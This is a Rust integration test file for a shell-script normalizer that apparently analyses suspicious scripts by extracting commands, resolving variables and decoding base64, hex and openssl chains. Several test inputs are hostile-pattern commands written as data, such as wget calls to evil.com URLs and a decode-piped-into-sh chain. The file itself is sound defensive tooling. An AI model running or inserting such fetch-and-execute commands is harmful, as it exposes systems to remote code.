//! Semantic normalization integration tests for shell AST post-processing.

use arbitraitor_model::ids::Sha256Digest;
use arbitraitor_shell::{DecodeKind, ShellParser, normalize};
use sha2::{Digest, Sha256};

fn normalize_source(
    source: &str,
) -> Result<arbitraitor_shell::NormalizationResult, Box<dyn std::error::Error>> {
    let mut parser = ShellParser::new()?;
    let parsed = parser.parse_str(source);
    Ok(normalize(&parsed.ast, source)?)
}

fn digest(bytes: &[u8]) -> Sha256Digest {
    Sha256Digest::new(Sha256::digest(bytes).into())
}

#[test]
fn extracts_simple_commands_from_ast() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("wget http://evil.com\n")?;
    assert_eq!(result.commands[0].name, "wget");
    assert_eq!(result.commands[0].arguments, ["http://evil.com"]);
    Ok(())
}

#[test]
fn constant_propagation_resolves_variables() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("X=bar; echo $X\n")?;
    assert_eq!(result.variable_bindings.get("X"), Some(&"bar".to_owned()));
    assert_eq!(result.commands[0].arguments, ["bar"]);
    Ok(())
}

#[test]
fn constant_propagation_chains_assignments() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("X=hello; Y=\"$X world\"; echo $Y\n")?;
    assert_eq!(
        result.variable_bindings.get("Y"),
        Some(&"hello world".to_owned())
    );
    assert_eq!(result.commands[0].arguments, ["hello world"]);
    Ok(())
}

#[test]
fn pipe_graph_captures_data_flow() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("cmd1 | cmd2 | cmd3\n")?;
    assert_eq!(result.data_flow.edges, [(0, 1), (1, 2)]);
    Ok(())
}

#[test]
fn base64_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | base64 -d | sh\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::Base64 && artifact.content == b"Hello")
    );
    Ok(())
}

#[test]
fn hex_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"\\x48\\x65\\x6c\\x6c\\x6f\" | xxd -r -p\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::Hex && artifact.content == b"Hello")
    );
    Ok(())
}

#[test]
fn decoded_artifact_has_correct_sha256() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | base64 -d\n")?;
    let artifact = result
        .decoded_artifacts
        .iter()
        .find(|artifact| artifact.kind == DecodeKind::Base64)
        .ok_or("missing base64 artifact")?;
    assert_eq!(artifact.digest, digest(b"Hello"));
    Ok(())
}

#[test]
fn url_extraction_from_string_constants() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("URL=https://evil.com/a.sh; wget \"$URL\"\n")?;
    assert!(
        result
            .urls
            .iter()
            .any(|url| url.url == "https://evil.com/a.sh")
    );
    Ok(())
}

#[test]
fn heredoc_content_becomes_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("cat << 'EOF'\necho child\nEOF\n")?;
    assert!(result.decoded_artifacts.iter().any(
        |artifact| artifact.kind == DecodeKind::Heredoc && artifact.content == b"echo child\n"
    ));
    Ok(())
}

#[test]
fn oversized_decode_is_truncated_or_skipped() -> Result<(), Box<dyn std::error::Error>> {
    let oversized = "QQ==".repeat(600_000);
    let source = format!("echo {oversized} | base64 -d\n");
    let result = normalize_source(&source)?;
    assert!(result.decoded_artifacts.is_empty());
    Ok(())
}

#[test]
fn dynamic_variables_not_resolved() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo $RANDOM\n")?;
    assert_eq!(result.commands[0].arguments, ["$RANDOM"]);
    assert!(result.variable_bindings.is_empty());
    Ok(())
}

#[test]
fn openssl_decode_chain() -> Result<(), Box<dyn std::error::Error>> {
    let result = normalize_source("echo \"SGVsbG8=\" | openssl enc -d -base64\n")?;
    assert!(
        result
            .decoded_artifacts
            .iter()
            .any(|artifact| artifact.kind == DecodeKind::OpenSsl && artifact.content == b"Hello")
    );
    Ok(())
}
